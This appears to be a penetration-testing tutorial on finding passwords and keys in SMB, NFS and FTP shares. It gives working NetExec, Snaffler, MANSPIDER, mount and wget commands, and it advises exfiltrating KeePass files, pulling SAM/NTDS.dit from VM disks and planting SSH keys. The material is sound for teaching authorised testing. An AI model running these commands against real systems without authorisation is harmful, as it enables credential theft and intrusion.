---
title: "Credential Hunting in Network Shares"
description: "How to search SMB, NFS, and FTP shares for files containing sensitive information and passwords."
tags:
  - password-attacks
  - credential-hunting
  - network-shares
  - smb
  - nfs
  - snaffler
icon: material/folder-network
---

# 📁 Credential Hunting in Network Shares

Organizations rely on network shares (SMB/CIFS in Windows, NFS in Linux) for collaboration, backups, and script deployments. Due to poor access controls, these shares often become dumping grounds for sensitive data, including unencrypted passwords, API keys, database connection strings, and backup files containing hashes.

Searching network shares is one of the most fruitful reconnaissance activities during an internal penetration test.

---

## 1️⃣ Hunting on SMB Shares

SMB (Server Message Block) is the standard file-sharing protocol in Active Directory environments. Finding open or poorly permissions SMB shares is trivial.

### Finding Open Shares (NetExec)
If you have a valid set of credentials (or a null session works), you can map all shares across a subnet and check your permissions:

```bash
netexec smb 10.10.10.0/24 -u user -p pass --shares
```
Look for shares marked with `READ` or `READ/WRITE` access. `SYSVOL` and `NETLOGON` are usually readable by any domain user and are excellent starting points.

#### Spidering Shares with NetExec
Instead of just listing shares, NetExec has a built-in `--spider` module to recursively search through readable shares for specific file extensions or keyword matches.

```bash
# Spider a specific share for files with 'pass' in the name
netexec smb 10.10.10.10 -u user -p pass --spider 'DataShare' --pattern 'pass'

# Spider all readable shares for text and config files
netexec smb 10.10.10.0/24 -u user -p pass --spider-share "ALL" --regex '.*\.(txt|conf|ini|xml)$'

# Search inside file contents (not just filenames)
netexec smb 10.10.10.10 -u user -p pass --spider 'DataShare' --pattern 'password' --content
```

### SYSVOL and Group Policy Preferences (GPP)
The `SYSVOL` share contains Group Policy Objects (GPOs). Historically, administrators used Group Policy Preferences (GPP) to push out local administrator passwords to all machines.

These passwords were encrypted in `Groups.xml` files using a static AES key published by Microsoft, making them trivial to decrypt.

```bash
# Look for Groups.xml in SYSVOL
# \\<domain>\SYSVOL\<domain>\Policies\{UUID}\Machine\Preferences\Groups\Groups.xml

# NetExec can automatically search for and decrypt GPP passwords:
netexec smb 10.10.10.10 -u user -p pass -M gpp_password
```

### Automated Searching with Snaffler
**Snaffler** is a C# tool designed for penetration testers. It crawls SMB shares across an entire Active Directory domain and searches for files containing sensitive data based on regex patterns (e.g., connection strings, password variables, private keys).

```cmd
# Run Snaffler from a domain-joined machine
Snaffler.exe -s -d corp.local -o snaffler_results.txt
```
Snaffler color-codes its output, highlighting high-probability hits (like `.kdbx` KeePass databases, `web.config` files with DB credentials, or `id_rsa` keys).

### Deep Content Parsing with MANSPIDER
While Snaffler is excellent at finding sensitive file *names* and basic text contents, **MANSPIDER** goes a step further. MANSPIDER is a Python tool that uses Impacket to spider SMB shares and actually parses the *contents* of complex files (like Word documents, Excel spreadsheets, PDFs, and ZIP archives) to search for credentials and PII.

**Installation:**
```bash
pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
```

**Usage Examples:**
```bash
# Search for the string "password" inside Office docs and PDFs across the domain
manspider 10.10.10.0/24 -d corp.local -u user -p 'Password123!' -f "password"

# Search for specific file extensions
manspider 10.10.10.0/24 -d corp.local -u user -p 'Password123!' -e docx xlsx pdf
```
*Note: Because MANSPIDER downloads and parses complex file formats, it generates significant network traffic and is much slower than tools that only check filenames.*

### Auditing Share Permissions with PowerHuntShares
If you need a comprehensive audit of SMB shares rather than just a keyword search, **PowerHuntShares** (by NetSPI) is an excellent PowerShell tool. It inventories all SMB shares on an Active Directory domain, checks permissions, and identifies open shares that could contain sensitive data.

PowerHuntShares generates easy-to-read CSV or HTML reports showing exactly which shares are readable or writable by standard users.

```powershell
# Import the module
Import-Module .\PowerHuntShares.psm1

# Run it against the domain
Invoke-HuntShares -Threads 20 -OutputDirectory C:\temp\share_audit
```

---

## 2️⃣ Hunting on NFS Shares

NFS (Network File System) is common in Unix/Linux environments. It often suffers from misconfigurations where shares are exported to the entire network or lack root-squashing.

### Finding NFS Exports
```bash
# Show available NFS exports on a target
showmount -e 10.10.10.20
```

### Mounting and Searching
```bash
# Create a mount point
mkdir /tmp/nfs_mount

# Mount the share
sudo mount -t nfs 10.10.10.20:/exported/share /tmp/nfs_mount

# Search the mounted share for sensitive files
grep -riE 'password|pass|key|secret' /tmp/nfs_mount/
```

If the share allows write access, you might be able to read sensitive files, or write your own SSH key to a user's `/home/.ssh/authorized_keys` directory if their home directory is exported.

---

## 3️⃣ Hunting on FTP Shares

Anonymous FTP access is a classic misconfiguration. Even if anonymous access is disabled, compromised credentials can give you access to an FTP server used for backups or web development.

### Automated Scraping with wget
If an FTP server allows anonymous access and contains many directories, manually browsing it is slow. You can use `wget` to recursively download the entire FTP site for offline analysis.

```bash
# Recursively download an anonymous FTP share
wget -m ftp://anonymous:anonymous@10.10.10.30

# Search the downloaded files
grep -ri 'password' 10.10.10.30/
```

---

## 4️⃣ Key Files to Look For

When searching network shares (regardless of the protocol), prioritize looking for:

| File Type / Name | Why it's valuable |
|------------------|-------------------|
| `*.kdbx`, `*.kdb` | KeePass databases. Exfiltrate and crack the master password. |
| `web.config`, `app.config` | IIS / .NET configuration files. Often contain cleartext SQL connection strings. |
| `id_rsa`, `*.pem`, `*.ppk` | SSH private keys. |
| `unattend.xml`, `sysprep.inf` | Windows deployment answer files containing local admin passwords. |
| `*.vmdk`, `*.vhdx` | Virtual machine disks. You can mount these locally to extract the SAM/NTDS.dit offline. |
| `*.bak`, `*.sql` | Database backups. May contain user tables with crackable hashes. |

---

!!! warning
    **Automated tools like Snaffler generate a massive amount of SMB traffic. In highly monitored environments, this behavior may trigger IDS/EDR alerts for abnormal file access or ransomware-like behavior.**
